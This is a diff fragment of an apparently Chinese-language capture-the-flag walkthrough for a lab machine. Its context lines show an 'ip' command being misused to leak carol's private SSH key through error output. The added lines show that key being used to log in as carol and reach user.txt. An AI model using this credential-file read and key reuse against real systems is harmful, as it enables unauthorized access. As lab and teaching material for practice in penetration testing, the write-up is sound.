@@ -571,3 +571,28 @@ Command failed /home/carol/.ssh/id_rsa:37
 Object "-----END" is unknown, try "ip help".
 Command failed /home/carol/.ssh/id_rsa:38
 ```
+读到ssh密钥，登录成功
+```bash
+┌──(kali㉿kali)-[~/tmp/tmp]
+└─$ chmod 600 carol.key
+
+┌──(kali㉿kali)-[~/tmp/tmp]
+└─$ ssh -i carol.key carol@10.251.177.85
+The authenticity of host '10.251.177.85 (10.251.177.85)' can't be established.
+ED25519 key fingerprint is SHA256:xJ90oWmr5sPR2afHz9etzSdtxINmLI+JvbwgV/iCsWY.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:4: [hashed name]
+    ~/.ssh/known_hosts:5: [hashed name]
+    ~/.ssh/known_hosts:12: [hashed name]
+    ~/.ssh/known_hosts:16: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.251.177.85' (ED25519) to the list of known hosts.
+              _
+__      _____| | ___ ___  _ __ ___   ___
+\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
+ \ V  V /  __/ | (_| (_) | | | | | |  __/
+  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|
+
+carol@Baker:~$ ls
+user.txt
+```
